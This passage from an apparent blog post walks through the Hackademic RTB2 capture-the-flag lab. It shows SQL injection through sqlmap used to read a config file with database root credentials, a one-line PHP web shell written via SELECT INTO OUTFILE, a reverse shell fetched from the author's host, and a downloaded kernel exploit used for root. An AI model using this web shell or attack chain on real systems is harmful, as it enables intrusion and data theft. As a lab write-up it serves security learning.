<p>Well, these hashes won&rsquo;t help much, as a quick search didn&rsquo;t give me any way to crack them fast and easy. I did research a bit on the internet and found out that these are salted hashes, stored in the format <code>md5 hash:salt</code>. I also found there is a Perl script that can help with cracking such hashes, called <a href="http://morxploit.com/joomlacrack.txt">joomlacrack.pl</a>. But I thought I might not need to crack them if I could use sqlmap to execute commands on the server and write a PHP backdoor there. So that&rsquo;s what I tried next. Passing <em>pwd</em> to <em>&mdash;os-cmd</em> gave me the location of the current directory, which is /var/www. I tried writing a shell directly in this location but I failed. So next I listed the contents of the present directory and noticed a <em>configuration.php</em> file that I read, and inside there were credentials for the database:</p>

<p><code>plain
/* Database Settings */
var $dbtype = 'mysql';
var $host = 'localhost';
var $user = 'root';
var $password = 'yUtJklM97W';
var $db = 'joomla';
var $dbprefix = 'jos_';
</code></p>

<p>I went to the phpmyadmin interface and logged in as root. Then I was able to use SQL to create a rudimentary shell:</p>

<p><code>sql
SELECT
"&lt;? system($_REQUEST['cmd']); ?&gt;"
INTO OUTFILE "/var/www/cmd.php";
</code></p>

<p>After uploading this shell, I used to download the reverse PHP shell that I hosted with Python&rsquo;s SimpleHTTPServer. And then I navigated to it and received the connection on my Netcat listener:</p>

<p><code>plain
Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
 15:14:37 up  4:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
</code></p>

<p>The local exploit that worked was the same one I used in the previous Hackademic challenge, the <a href="https://www.exploit-db.com/exploits/15285/">RDS Protocol Local Privilege Escalation exploit</a>. Again, I used wget to download it from my machine and ran it:</p>

<p><code>plain
[snipped]
[*] Restoring function pointer...
id
uid=0(root) gid=0(root)
ls /root/
Desktop
Key.txt
</code></p>

<p>Trying to read the key gave a huge base64 encoded string, so I copied it to the web server directory, gave it permissions for everyone, and then I downloaded it on my machine, where I could decode it:</p>

<p><code>plain
root@pwnbox:~/Downloads#base64 -d key.txt &gt; decoded
root@pwnbox:~/Downloads#file decoded
decoded: PNG image data, 756 x 344, 8-bit/color RGB, non-interlaced
</code></p>

<p>So it&rsquo;s an image! (when I tried reading it there was binary garbage, so I assumed it must be another type of file than a text one). I used this <a href="http://codebeautify.org/base64-to-image-converter">base64 to image converter</a> to see the image:</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-win.png" title="&lsquo;hackademic rtb2&rsquo; &lsquo;hackademic rtb 2 finished&rsquo;" ></p>

<h1>Debriefing</h1>

<p>This host implemented a sneaky defense of port knocking in order to serve the second web server. It was a bit unrealistic to require a hardcoded value for the password parameter on the first web server in my opinion. The second server was vulnerable to real SQL injection that could read files on the system and execute commands. Having the database root credentials readily available allowed me to gain a foothold on the machine, from which the only step left was finding an exploit that would give me root.</p>

<p>``` plain
/ You are only young once, but you can \
\ stay immature indefinitely.          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
